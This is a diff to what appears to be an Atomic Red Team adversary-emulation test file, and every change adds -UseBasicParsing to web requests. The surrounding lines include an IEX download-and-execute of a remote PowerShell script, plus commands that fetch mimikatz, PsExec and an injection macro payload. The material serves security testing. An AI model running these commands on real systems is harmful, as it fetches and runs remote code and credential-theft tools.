@@ -35,7 +35,7 @@ atomic_tests:
       if (Test-Path #{txt_path}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{txt_path}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt" -OutFile "#{txt_path}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt" -OutFile "#{txt_path}" -UseBasicParsing
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -76,7 +76,7 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
       $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
-      $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
+      $zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
       $mimikatz_exe = cmd /c echo #{mimikatz_path}
       $basePath = Split-Path $mimikatz_exe | Split-Path
       Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
@@ -86,7 +86,7 @@ atomic_tests:
       if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip" -UseBasicParsing
       Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
       New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
       Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
